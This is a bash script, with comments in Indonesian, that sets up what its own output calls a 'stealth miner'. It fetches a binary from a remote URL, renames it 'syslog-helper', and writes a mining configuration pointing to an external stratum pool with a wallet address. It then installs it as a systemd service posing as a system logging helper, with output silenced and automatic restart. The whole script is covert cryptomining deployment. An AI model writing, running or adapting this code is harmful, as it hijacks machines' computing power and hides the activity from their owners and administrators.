#!/bin/bash

# --- KONFIGURASI ---
# Nama samaran untuk binary dan service
FAKE_NAME="syslog-helper"
BINARY_URL="https://gitlab.com/ferrynara12/mypro/-/raw/main/docker"
INSTALL_DIR="/usr/local/bin"
CONF_DIR="/etc/syslog-conf"

echo "--- Memulai Setup Stealth Miner di Server Pribadi ---"

# 1. Instal Dependensi
apt update && apt install -y curl libcurl4 libjansson4 libssl3

# 2. Buat direktori konfigurasi tersembunyi
mkdir -p $CONF_DIR

# 3. Download dan Rename Binary
echo "Mengunduh binary..."
curl -L $BINARY_URL -o $INSTALL_DIR/$FAKE_NAME
chmod +x $INSTALL_DIR/$FAKE_NAME

# 4. Buat file konfigurasi JSON
cat <<EOF > $CONF_DIR/config.json
{
    "algo": "yespower",
    "url": "stratum+tcp://dagnam.xyz:4629",
    "user": "WXDNsKHm8X4RQm9tMpXaLMmxb8Mp1Vxvh6.1",
    "pass": "c=SWAMP",
    "threads": $(nproc ),
    "quiet": true
}
EOF

# 5. Buat Systemd Service (Agar jalan otomatis 24/7)
cat <<EOF > /etc/systemd/system/$FAKE_NAME.service
[Unit]
Description=System Logging Helper Service
After=network.target

[Service]
Type=simple
ExecStart=$INSTALL_DIR/$FAKE_NAME -c $CONF_DIR/config.json
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

# 6. Jalankan Service
systemctl daemon-reload
systemctl enable $FAKE_NAME
systemctl start $FAKE_NAME

echo "--- Setup Selesai! ---"
echo "Miner berjalan sebagai service: $FAKE_NAME"
echo "Cek status: systemctl status $FAKE_NAME"
echo "Cek proses: ps aux | grep $FAKE_NAME"
